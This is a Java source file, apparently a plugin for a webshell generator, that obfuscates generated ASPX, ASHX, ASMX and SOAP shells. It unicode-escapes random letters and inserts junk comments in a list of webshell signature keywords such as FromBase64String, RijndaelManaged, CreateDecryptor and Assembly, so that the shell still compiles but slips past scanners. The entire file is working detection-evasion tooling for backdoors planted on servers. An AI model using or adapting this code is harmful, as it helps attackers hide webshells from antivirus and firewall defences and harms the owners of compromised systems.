package core.shellprocessor.aspxJunkCode;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Random;

@GenerateProcessor(
        DisplayName = "JunkCode",
        superTemplate = {"aspx", "ashx", "asmx", "soap"}
)
public class ASPXJunkCode implements ShellProcessor {

    private static final String[] KEYWORDS = new String[]{
            "System.Text.Encoding.Default.GetBytes",
            "System.IO.MemoryStream",
            "MD5CryptoServiceProvider",
            "System.BitConverter",
            "System.Reflection",
            "FromBase64String",
            "ToBase64String",
            "CreateDecryptor",
            "CreateEncryptor",
            "Context.Request",
            "Context.Response",
            "Context.Session",
            "TransformFinalBlock",
            "CreateInstance",
            "ContentLength",
            "Cryptography",
            "System.Security",
            "System.Convert",
            "System.Type",
            "BinaryRead",
            "BinaryWrite",
            "ComputeHash",
            "GetMethod",
            "RijndaelManaged",
            "Assembly",
            "ToString",
            "magicNum1",
            "magicNum2"
    };

    public ASPXJunkCode() {
    }

    /**
     * Keep C# identifiers valid: unicode-escape the same letter, and insert
     * comments only after dots. Random Cf/Mn junk previously broke aspx/ashx.
     */
    public static String AspxJunkCode(String text) {
        if (text == null || text.isEmpty()) {
            return text;
        }
        String[] list = KEYWORDS.clone();
        Arrays.sort(list, Comparator.comparingInt(String::length).reversed());
        String result = text;
        Random rnd = new Random();
        for (int i = 0; i < list.length; ++i) {
            String s = list[i];
            if (result.contains(s)) {
                result = result.replace(s, obfuscateToken(s, rnd));
            }
        }
        return result;
    }

    static String obfuscateToken(String token, Random rnd) {
        StringBuilder sb = new StringBuilder(token.length() * 6);
        for (int i = 0; i < token.length(); i++) {
            char c = token.charAt(i);
            if (c == '.') {
                sb.append("./*").append(Integer.toHexString(rnd.nextInt(0xfff) + 0x100)).append("*/");
                continue;
            }
            if (Character.isLetter(c) && rnd.nextBoolean()) {
                sb.append(String.format("\\u%04x", (int) c));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        String shellContent = new String(shell);
        shellContent = AspxJunkCode(shellContent);
        return shellContent.getBytes();
    }
}
